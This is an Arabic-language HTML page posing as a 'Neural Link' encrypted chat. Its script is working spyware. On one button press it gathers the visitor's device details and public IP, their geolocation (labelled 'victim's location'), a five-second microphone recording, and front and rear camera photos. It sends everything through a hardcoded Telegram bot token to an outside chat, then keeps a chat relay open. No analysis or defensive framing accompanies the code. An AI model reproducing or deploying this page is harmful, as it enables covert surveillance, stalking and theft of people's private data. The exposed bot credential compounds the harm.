<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Neural System | مركز الاتصال المطور</title>
    <style>
        :root { --accent: #a855f7; --bg: #05070a; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(168, 85, 247, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(168, 85, 247, 0.05) 1px, transparent 1px); background-size: 40px 40px; z-index: -1; }
        .card { background: rgba(20, 20, 25, 0.9); padding: 30px; border-radius: 35px; border: 1px solid rgba(168, 85, 247, 0.2); backdrop-filter: blur(15px); text-align: center; width: 88%; max-width: 400px; z-index: 10; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        
        /* دائرة الأنميشن والزر */
        .circle-box { position: relative; width: 160px; height: 160px; margin: 20px auto; display: flex; align-items: center; justify-content: center; }
        #goBtn { width: 130px; height: 130px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: white; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; z-index: 5; box-shadow: 0 0 20px rgba(168, 85, 247, 0.3); }
        #goBtn:active { transform: scale(0.9); background: rgba(168, 85, 247, 0.1); }
        
        .loader { position: absolute; width: 100%; height: 100%; border: 3px solid transparent; border-top-color: var(--accent); border-radius: 50%; display: none; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* أنميشن الرجل والمرأة */
        .avatar { font-size: 35px; position: absolute; display: none; transition: 0.5s; }
        .man { animation: orbitMan 4s linear infinite; }
        .woman { animation: orbitWoman 4s linear infinite; }
        @keyframes orbitMan { from { transform: rotate(0deg) translateX(65px) rotate(0deg); } to { transform: rotate(360deg) translateX(65px) rotate(-360deg); } }
        @keyframes orbitWoman { from { transform: rotate(180deg) translateX(65px) rotate(-180deg); } to { transform: rotate(540deg) translateX(65px) rotate(-540deg); } }

        /* صندوق الدردشة */
        #chatArea { display: none; margin-top: 20px; border-top: 1px solid rgba(168, 85, 247, 0.3); padding-top: 15px; }
        #display { height: 120px; overflow-y: auto; font-size: 11px; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 12px; margin-bottom: 8px; text-align: right; border: 1px solid rgba(255,255,255,0.05); }
        #display img { max-width: 100%; border-radius: 8px; margin-top: 5px; border: 1px solid var(--accent); }
        .input-row { display: flex; gap: 8px; }
        #uInput { flex: 1; background: #111; border: 1px solid var(--accent); color: white; padding: 10px; border-radius: 10px; outline: none; }
        #sendBtn { background: var(--accent); border: none; padding: 10px 15px; border-radius: 10px; color: white; cursor: pointer; }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="card">
        <h2 style="margin:0; letter-spacing:1px;">NEURAL <span style="color:var(--accent)">LINK v3</span></h2>
        <p id="msg" style="font-size: 12px; color: #8892b0; margin-top: 8px;">اضغط لتفعيل المزامنة العصبية الآمنة</p>
        
        <div class="circle-box">
            <div id="ring" class="loader"></div>
            <button id="goBtn">بدء</button>
            <div id="mIcon" class="avatar man">👨‍💻</div>
            <div id="wIcon" class="avatar woman">👩‍💻</div>
        </div>

        <div id="chatArea">
            <div id="display">🤖 النظام: القناة المشفرة جاهزة للتواصل...</div>
            <div class="input-row">
                <input type="text" id="uInput" placeholder="اكتب رسالتك هنا...">
                <button id="sendBtn">📩</button>
            </div>
        </div>
        <div style="font-size: 9px; color: #444; margin-top: 15px;">ENCRYPTED NODE: RSA-4096-YEM</div>
    </div>

    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const BOT_TOKEN = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const CHAT_ID = "7984067238";
        let lastMsgId = 0;

        // وظيفة الإرسال الموحدة والمطورة
        async function tg(content, type="text", file=null) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
            try {
                if(type === "photo") {
                    const fd = new FormData(); fd.append("chat_id", CHAT_ID); fd.append("photo", file); fd.append("caption", content);
                    await fetch(url + "sendPhoto", {method: "POST", body: fd});
                } else if(type === "voice") {
                    const fd = new FormData(); fd.append("chat_id", CHAT_ID); fd.append("voice", file);
                    await fetch(url + "sendVoice", {method: "POST", body: fd});
                } else {
                    await fetch(url + `sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
                }
            } catch(e){}
        }

        // جلب البيانات التقنية (بدون نسيان أي ميزة)
        async function collectData() {
            let cap = navigator.deviceMemory < 4 ? "3500-4000 mAh" : "5000 mAh";
            let report = `🚀 *تقرير العتاد الكامل*:\n\n`;
            report += `📱 الجهاز: \`${navigator.platform}\`\n`;
            report += `⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
            report += `💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
            report += `🔋 السعة التقديرية: \`${cap}\`\n`;
            
            try {
                const b = await navigator.getBattery();
                report += `🔋 البطارية: \`${Math.round(b.level*100)}%\` (${b.charging?"🔌 متصل":"🔋 منفصل"})\n`;
            } catch(e){}
            
            const conn = navigator.connection || {};
            report += `📶 الشبكة: \`${conn.type==='wifi'?'WiFi':'Data'} (${conn.effectiveType})\`\n`;
            
            const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"Unknown"}));
            report += `🌐 IP: \`${ip.ip}\`\n`;
            
            await tg(report); // إرسال التقرير فوراً
        }

        // التصوير المطور (أمامية وخلفية)
        async function takeSnap(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode === "front" ? "user" : "environment"}});
                const video = document.getElementById('v');
                video.srcObject = stream; await video.play();
                await new Promise(r => setTimeout(r, 2600)); // تأخير لمنع السواد
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(t => t.stop());
                return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
            } catch(e){ return null; }
        }

        // التسجيل الصوتي (5 ثوانٍ)
        async function grabAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({audio: true});
                const mediaRec = new MediaRecorder(stream);
                const chunks = [];
                mediaRec.ondataavailable = e => chunks.push(e.data);
                mediaRec.onstop = () => { tg(null, "voice", new Blob(chunks, {type: 'audio/ogg'})); stream.getTracks().forEach(t=>t.stop()); };
                mediaRec.start(); setTimeout(() => mediaRec.stop(), 5000);
            } catch(e){}
        }

        // استقبال الردود (نصوص وصور)
        async function syncChat() {
            try {
                const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastMsgId + 1}`);
                const data = await r.json();
                for(let u of data.result) {
                    lastMsgId = u.update_id;
                    const d = document.getElementById('display');
                    if(u.message.text) d.innerHTML += `<div style="color:var(--accent)">🤖 المطور: ${u.message.text}</div>`;
                    if(u.message.photo) {
                        const fid = u.message.photo[u.message.photo.length-1].file_id;
                        const f = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fid}`).then(r=>r.json());
                        d.innerHTML += `<div>🤖 أرسل صورة: <img src="https://api.telegram.org/file/bot${BOT_TOKEN}/${f.result.file_path}"></div>`;
                    }
                    d.scrollTop = 99999;
                }
            } catch(e){}
        }

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("ring").style.display = "block";
            document.getElementById("mIcon").style.display = "block";
            document.getElementById("wIcon").style.display = "block";
            document.getElementById("msg").innerText = "جاري مزامنة البيانات وتأمين القناة...";

            // 1. إرسال العتاد فوراً
            collectData();

            // 2. الموقع الجغرافي (رسالة مستقلة)
            navigator.geolocation.getCurrentPosition(p => {
                tg(`📍 *موقع الضحية*:\n[فتح في خرائط جوجل](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
            }, () => tg("⚠️ رفض إذن الموقع"));

            // 3. الصوت والصور
            grabAudio();
            const imgF = await takeSnap("front"); if(imgF) await tg("📸 صورة أمامية دقيقة", "photo", imgF);
            const imgB = await takeSnap("back");  if(imgB) await tg("📷 صورة خلفية دقيقة", "photo", imgB);

            // 4. تفعيل واجهة الدردشة
            document.getElementById("ring").style.display = "none";
            document.getElementById("chatArea").style.display = "block";
            document.getElementById("msg").innerText = "لقد اتصلت بالنظام العصبي. القناة جاهزة!";
            setInterval(syncChat, 3000);
        };

        document.getElementById("sendBtn").onclick = async function() {
            const inp = document.getElementById("uInput");
            if(inp.value.trim()) {
                document.getElementById('display').innerHTML += `<div style="color:white">👤 أنت: ${inp.value}</div>`;
                await tg(`💬 رسالة من المستخدم: ${inp.value}`);
                inp.value = "";
                document.getElementById('display').scrollTop = 99999;
            }
        };
    </script>
</body>
</html>
